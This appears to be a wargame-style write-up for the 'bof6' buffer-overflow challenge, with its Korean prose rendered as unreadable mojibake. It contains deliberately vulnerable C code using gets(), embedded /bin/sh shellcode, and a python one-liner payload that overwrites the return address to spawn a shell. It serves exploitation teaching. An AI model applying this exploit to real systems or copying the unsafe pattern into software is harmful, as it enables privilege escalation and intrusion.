# bof6 ����

## bof6.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON


void vuln() {
    char buf[BUF_SIZE];
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

    printf("[shellcode:%p]\n", shellcode);
    gets(buf);
    printf("Hello %s!\n", buf);

    if (setreuid(1006, 1006)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1006, 1006)) {
        perror("setgid");
        exit(1);
    }
}

int main() {
    vuln();
    return 0;
}
```

�ڵ带 ���� `gets` �Լ��� ����� ���� �� �� �ִ�.

---

## ���� ���

`gets`�� ���� `buf`�� Return Address ������ Dummy ���� ä�� `vuln` �Լ��� Return Address�� `shellcode`�� ����Ű�� �ּҸ� �־� ������ ���̴�. ��, ������ Ret-sled ����� ����Ѵ�.

---

## ���

![bof6_1](img/bof6_1.png)

`vuln`�Լ��� breakpoint�� �� ��, `rsp` �������Ͱ� ��� �ִ� �ּҰ��� Ȯ���Ѵ�.

�� �ּҴ� `vuln` �Լ��� Return Address �̴�.

![bof6_2](img/bof6_2.png)

`gets`�Լ��� breakpoint�� �� ��, `rdi` �������Ͱ� ��� �ִ� �ּҰ��� Ȯ���Ѵ�.

�� �ּҴ� `buf` ������ �ּ� �̴�.

![bof6_3](img/bof6_3.png)

`shellcode`������ �ּҰ��� `./bof6`�� ������� Ȯ���Ѵ�. ������ ������ �ּҰ��� �ٲ��� �ʴ��� Ȯ���Ѵ�.

![bof6_4](img/bof6_4.png)

```shell
$ (python -c 'print "a"*136+"\x30\xeb\xff\xff\xff\x7f"'; cat) | ./bof6
```

���� ���� ���� ������ payload, ���� ������ �ۼ��� �Է��ϸ� ���� ���� shell�� ���� �� ������ Ȯ���� �� �ִ�.